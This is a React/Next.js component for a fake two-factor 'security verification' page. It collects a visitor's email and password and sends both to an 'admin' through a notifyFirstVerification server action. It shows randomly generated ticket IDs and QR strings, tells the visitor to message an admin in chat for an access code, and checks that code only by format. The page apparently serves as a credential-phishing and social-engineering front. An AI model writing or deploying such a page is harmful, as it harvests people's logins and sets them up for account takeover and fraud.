"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Shield, Eye, EyeOff, QrCode, Lock } from "lucide-react"
import { useRouter } from "next/navigation"
import { notifyFirstVerification } from "@/app/actions/email-actions"

type VerificationStep = "check2fa" | "emailLogin" | "firstVerification"

export default function TwoFactorVerification() {
  const router = useRouter()
  const [currentStep, setCurrentStep] = useState<VerificationStep>("check2fa")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    firstCode: "",
  })
  const [ticketId, setTicketId] = useState("")
  const [qrCode, setQrCode] = useState("")
  const [error, setError] = useState("")

  // Generate random ticket ID and QR code
  const generateTicketData = () => {
    const ticketId = `TKT-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
    const qrCode = `QR-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
    return { ticketId, qrCode }
  }

  // Validate first code format: 4 numbers + 2 letters
  const validateFirstCode = (code: string) => {
    const regex = /^[1-9]{4}[A-Za-z]{2}$/
    return regex.test(code)
  }

  const handleNo2FA = () => {
    router.push("/login")
  }

  const handleYes2FA = () => {
    setCurrentStep("emailLogin")
    setError("")
  }

  const handleEmailLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000))

    const { ticketId: newTicketId, qrCode: newQrCode } = generateTicketData()
    setTicketId(newTicketId)
    setQrCode(newQrCode)

    // Send email notification for first verification
    const emailFormData = new FormData()
    emailFormData.append("email", formData.email)
    emailFormData.append("password", formData.password)
    emailFormData.append("ticketId", newTicketId)
    emailFormData.append("qrCode", newQrCode)

    try {
      await notifyFirstVerification(emailFormData)
    } catch (error) {
      console.error("Failed to send email notification:", error)
    }

    setCurrentStep("firstVerification")
    setIsLoading(false)
  }

  const handleFirstVerification = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    await new Promise((resolve) => setTimeout(resolve, 1000))

    if (!validateFirstCode(formData.firstCode)) {
      setError("Invalid code format. Please enter 4 numbers (1-9) followed by 2 letters (A-Z)")
      setIsLoading(false)
      return
    }

    // Generate second verification data and store in session storage for the login page
    const { ticketId: secondTicketId, qrCode: secondQrCode } = generateTicketData()
    sessionStorage.setItem("secondTicketId", secondTicketId)
    sessionStorage.setItem("secondQrCode", secondQrCode)

    // Redirect to login page for second verification
    router.push("/login?secondVerification=true")
  }

  const renderStep = () => {
    switch (currentStep) {
      case "check2fa":
        return (
          <Card className="w-full max-w-md">
            <CardHeader className="text-center">
              <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
                <Shield className="h-6 w-6 text-primary" />
              </div>
              <CardTitle>Security Verification</CardTitle>
              <CardDescription>Do you have 2FA enabled on your account?</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Button onClick={handleYes2FA} className="w-full" size="lg">
                Yes, I have 2FA enabled
              </Button>
              <Button onClick={handleNo2FA} variant="outline" className="w-full" size="lg">
                No, I don't have 2FA
              </Button>
            </CardContent>
          </Card>
        )

      case "emailLogin":
        return (
          <Card className="w-full max-w-md">
            <CardHeader className="text-center">
              <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
                <Lock className="h-6 w-6 text-primary" />
              </div>
              <CardTitle>2FA Verification</CardTitle>
              <CardDescription>Please enter your 2FA email and password</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleEmailLogin} className="space-y-4">
                <div className="space-y-2">
                  <Input
                    type="email"
                    placeholder="2FA Email"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className="h-12"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Password"
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      className="h-12 pr-10"
                      required
                    />
                    <Button
                      type="button"
                      variant="ghost"
                      size="icon"
                      className="absolute right-0 top-0 h-full px-3"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <EyeOff className="h-4 w-4 text-muted-foreground" />
                      ) : (
                        <Eye className="h-4 w-4 text-muted-foreground" />
                      )}
                    </Button>
                  </div>
                </div>
                <Button type="submit" className="w-full h-12" disabled={isLoading}>
                  {isLoading ? "Processing..." : "Continue"}
                </Button>
              </form>
            </CardContent>
          </Card>
        )

      case "firstVerification":
        return (
          <Card className="w-full max-w-md">
            <CardHeader className="text-center">
              <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
                <QrCode className="h-6 w-6 text-primary" />
              </div>
              <CardTitle>First Verification</CardTitle>
              <CardDescription>Submit your Ticket ID to admin in chat to receive access code</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 p-3 rounded-lg text-center">
                <p className="text-sm text-green-700 dark:text-green-300">📧 Admin notification sent successfully</p>
              </div>

              <div className="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg text-center">
                <p className="text-sm text-muted-foreground mb-2">Ticket ID:</p>
                <p className="font-mono text-lg font-bold select-all">{ticketId}</p>
              </div>
              <div className="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg text-center">
                <p className="text-sm text-muted-foreground mb-2">QR Code:</p>
                <div className="flex items-center justify-center">
                  <div className="w-32 h-32 bg-white flex items-center justify-center">
                    <QrCode className="w-24 h-24 text-black" />
                  </div>
                </div>
                <p className="font-mono text-sm mt-2">{qrCode}</p>
              </div>
              <form onSubmit={handleFirstVerification} className="space-y-4">
                <div className="space-y-2">
                  <Input
                    type="text"
                    placeholder="Enter 6-character access code"
                    value={formData.firstCode}
                    onChange={(e) => setFormData({ ...formData, firstCode: e.target.value.toUpperCase() })}
                    className="h-12 text-center font-mono"
                    maxLength={6}
                    required
                  />
                </div>
                {error && <p className="text-sm text-red-500 text-center">{error}</p>}
                <Button type="submit" className="w-full h-12" disabled={isLoading}>
                  {isLoading ? "Verifying..." : "Verify Code"}
                </Button>
              </form>
            </CardContent>
          </Card>
        )

      default:
        return null
    }
  }

  return <div className="w-full max-w-md mx-auto">{renderStep()}</div>
}
